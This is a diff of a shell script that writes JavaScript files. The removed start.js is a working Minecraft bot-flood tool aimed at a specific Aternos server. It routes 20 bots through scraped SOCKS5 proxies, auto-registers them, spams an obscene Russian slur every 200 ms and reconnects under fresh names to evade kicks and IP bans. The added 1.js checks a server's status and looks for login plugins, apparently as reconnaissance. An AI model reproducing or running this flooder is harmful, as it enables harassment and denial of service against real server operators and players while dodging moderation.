@@ -1,1 +1,111 @@
-cat << 'EOF' > start.js const mineflayer = require('mineflayer') const { ProxyAgent } = require('proxy-agent') const axios = require('axios') const HOST = 'dadadada1233232.aternos.me' // Обновил хост с вашего скриншота const PORT = 49474 // Обновил порт с вашего скриншота const VERSION = '1.16.5' const BOT_BASE_NAME = 'Pidoras_' const BOT_COUNT = 20 const JOIN_DELAY = 2000 const AUTH_PASSWORD = 'StressPass123!' const SPAM_MESSAGE = 'PIDOR' const SPAM_INTERVAL = 200 // Обновленные и более надежные API-источники выдачи SOCKS5 const PROXY_SOURCES = [ 'https://proxyscrape.com', 'https://githubusercontent.com', 'https://githubusercontent.com', 'https://githubusercontent.com' ] let PROXIES = [] // Функция для жесткого автозагрузки прокси async function loadProxiesFromGitHub() { console.log('⏳ Попытка автоматического скачивания SOCKS5 прокси из API и GitHub...') let combinedProxies = [] for (const url of PROXY_SOURCES) { try { // Имитируем запрос от браузера, чтобы избежать блокировок хостинга const response = await axios.get(url, { timeout: 8000, headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'text/plain, */*' } }) if (response.data && typeof response.data === 'string') { const lines = response.data.split(/\r?\n/) .map(line => line.trim()) .filter(line => line.length > 0 && line.includes(':')) // Оставляем только строки вида IP:PORT if (lines.length > 0) { console.log(`✅ Успешно скачано ${lines.length} шт. из источника: ${url.substring(8, 30)}...`) combinedProxies = combinedProxies.concat(lines) } } } catch (err) { console.log(`⚠%EF%B8%8F Не удалось скачать прокси из: ${url.substring(8, 30)}... (Ошибка: ${err.message})`) } } // Фильтруем дубликаты const uniqueProxies = [...new Set(combinedProxies)] PROXIES = uniqueProxies.map(p => p.startsWith('socks5://') ? p : `socks5://${p}`) console.log(`📡 Общий итог: Загружено уникальных работающих прокси: ${PROXIES.length}`) } function cleanText(msg) { if (!msg) return '' return msg.toString().replace(/§[0-9a-fk-or]/g, '').replace(/\u001b\[[0-9;]*m/g, '').trim() } function getRandomHex(length) { const chars = 'abcdefghijklmnopqrstuvwxyz0123456789' let result = '' for (let i = 0; i < length; i++) { result += chars.charAt(Math.floor(Math.random() * chars.length)) } return result } function createBot(botId) { let botName = `${BOT_BASE_NAME}${getRandomHex(4)}` let spamTimer = null let messageLogged = false let isWorkingInWorld = false function start() { // Берем случайный прокси из общего пула скачанных адресов const currentProxyIndex = Math.floor(Math.random() * PROXIES.length) const proxyUrl = PROXIES.length > 0 ? PROXIES[currentProxyIndex] : null const botOptions = { host: HOST, port: PORT, username: botName, version: VERSION, connectTimeout: 20000 // Увеличили до 20 секунд для медленных бесплатных прокси } if (proxyUrl) { try { botOptions.agent = new ProxyAgent({ proxy: proxyUrl }) } catch (err) { console.log(`❌ Ошибка прокси для бота [${botName}]: ${err.message}`) } } const bot = mineflayer.createBot(botOptions) bot.on('message', (jsonMsg) => { const text = cleanText(jsonMsg.toString()).toLowerCase() if (text.includes('/register') || text.includes('зарегистрироваться') || text.includes('reg ')) { bot.chat(`/register ${AUTH_PASSWORD} ${AUTH_PASSWORD}`) } else if (text.includes('/login') || text.includes('войти') || text.includes('log ')) { bot.chat(`/login ${AUTH_PASSWORD}`) } if (text.includes('замучен') || text.includes('мут') || text.includes('muted') || text.includes('блокировка чата')) { if (text.includes(botName.toLowerCase()) || text.includes('вы замучены') || text.includes('ваш чат')) { console.log(`⚠%EF%B8%8F Бот [${botName}] ПОЛУЧИЛ МУТ!`) } } }) bot.on('spawn', () => { if (!spamTimer) { spamTimer = setInterval(() => { bot.chat(SPAM_MESSAGE) isWorkingInWorld = true if (!messageLogged) { messageLogged = true console.log(`✉ Бот [${botName}] зашел в игровой мир через прокси!`) } }, SPAM_INTERVAL) } }) bot.on('kick', (reason) => { if (spamTimer) clearInterval(spamTimer) console.log(`🚫 Бот [${botName}] КИКНУТ! Причина: ${cleanText(reason)}`) }) bot.on('error', (err) => { // Скрываем ошибки тайм-аута плохих прокси, чтобы не засорять экран терминала if (!err.message.includes('ETIMEDOUT') && !err.message.includes('ECONNREFUSED')) { console.log(`❌ Ошибка бота [${botName}]: ${err.message}`) } }) bot.on('end', () => { if (spamTimer) { clearInterval(spamTimer); spamTimer = null } if (isWorkingInWorld) { console.log(`🚫 Бот [${botName}] потерял соединение. Переподключение под новым именем...`) } botName = `${BOT_BASE_NAME}${getRandomHex(4)}` messageLogged = false isWorkingInWorld = false const reconnectDelay = Math.floor(Math.random() * 4000) + 4000 setTimeout(() => { start() }, reconnectDelay) }) } start() } async function main() { await loadProxiesFromGitHub() if (PROXIES.length === 0) { console.log('❌ Скрипту намертво заблокирован доступ к прокси-серверам в интернете!') console.log('⚠%EF%B8%8F Запуск БЕЗ прокси невозможен во избежание бана вашего основного IP. Скрипт остановлен.') process.exit(1) } console.log(`🤖 Запуск ${BOT_COUNT} ботов на ${HOST}:${PORT}...`) for (let i = 1; i <= BOT_COUNT; i++) { setTimeout(() => { createBot(i) }, (i - 1) * JOIN_DELAY) } } main() EOF
+cat << 'EOF' > 1.js
+const util = require('minecraft-server-util');
+const readline = require('readline');
+
+// Создаем интерфейс для чтения ввода из консоли
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+// Функция для задания вопросов в консоли
+const askQuestion = (query) => new Promise((resolve) => rl.question(query, resolve));
+
+async function main() {
+    console.clear();
+    console.log(`=========================================`);
+    console.log(`    MINECRAFT SERVER CHECKER (TERMUX)    `);
+    console.log(`=========================================\n`);
+
+    // Запрашиваем IP сервера
+    let host = await askQuestion('🌐 Введите IP сервера: ');
+    host = host.trim();
+
+    if (!host) {
+        console.log('❌ Ошибка: IP-адрес не может быть пустым!');
+        rl.close();
+        return;
+    }
+
+    // Запрашиваем Порт сервера
+    let portInput = await askQuestion('🔌 Введите ПОРТ сервера (нажмите Enter для 25565): ');
+    portInput = portInput.trim();
+    
+    // Если порт не введен, ставим стандартный 25565
+    const port = portInput ? parseInt(portInput, 10) : 25565;
+
+    if (isNaN(port) || port < 1 || port > 65535) {
+        console.log('❌ Ошибка: Некорректный номер порта!');
+        rl.close();
+        return;
+    }
+
+    console.log(`\n🔍 Проверка сервера ${host}:${port}...\n`);
+
+    try {
+        // Запрос статуса
+        const result = await util.status(host, port, { timeout: 6000 });
+
+        console.log(`✅ СЕРВЕР ДОСТУПЕН!`);
+        console.log(`-------------------------------------`);
+        console.log(`🔹 Версия:      ${result.version.name} (Протокол: ${result.version.protocol})`);
+        console.log(`🔹 Игроки:     ${result.players.online} / ${result.players.max}`);
+        
+        // Очистка MOTD от цветовых кодов параграфа (§)
+        const cleanMOTD = result.motd.clean.replace(/\n/g, ' ');
+        console.log(`🔹 MOTD (Инфо): ${cleanMOTD}`);
+
+        // Логика проверки авторизации
+        let authDetected = false;
+        let detectionReason = '';
+
+        const motdLower = cleanMOTD.toLowerCase();
+        const authKeywords = ['auth', 'login', 'register', 'войти', 'регистрация', 'пароль', 'reg', 'log', 'pass'];
+        
+        for (const keyword of authKeywords) {
+            if (motdLower.includes(keyword)) {
+                authDetected = true;
+                detectionReason = `найдено ключевое слово "${keyword}" в описании (MOTD)`;
+                break;
+            }
+        }
+
+        if (!authDetected && result.players.sample) {
+            const botKeywords = ['authme', 'nlogin', 'login', 'register'];
+            for (const player of result.players.sample) {
+                const nameLower = player.name.toLowerCase();
+                if (botKeywords.some(k => nameLower.includes(k))) {
+                    authDetected = true;
+                    detectionReason = `в списке игроков обнаружен системный бот (${player.name})`;
+                    break;
+                }
+            }
+        }
+
+        console.log(`-------------------------------------`);
+        if (authDetected) {
+            console.log(`🔐 Авторизация:  ПРИСУТСТВУЕТ (Причина: ${detectionReason})`);
+        } else {
+            console.log(`❓ Авторизация:  Точно определить не удалось.`);
+            console.log(`                 (Явных признаков в MOTD нет, требуется заход)`);
+        }
+        console.log(`-------------------------------------`);
+
+    } catch (error) {
+        console.log(`❌ СЕРВЕР НЕДОСТУПЕН!`);
+        console.log(`-------------------------------------`);
+        if (error.code === 'ENOTFOUND') {
+            console.log(`Ошибка: Неверный IP-адрес или домен (сервер не найден).`);
+        } else if (error.code === 'ECONNREFUSED') {
+            console.log(`Ошибка: Порт закрыт. Неверный порт или сервер выключен.`);
+        } else {
+            console.log(`Ошибка соединения: ${error.message}`);
+        }
+        console.log(`-------------------------------------`);
+    }
+
+    rl.close();
+}
+
+main();
+EOF
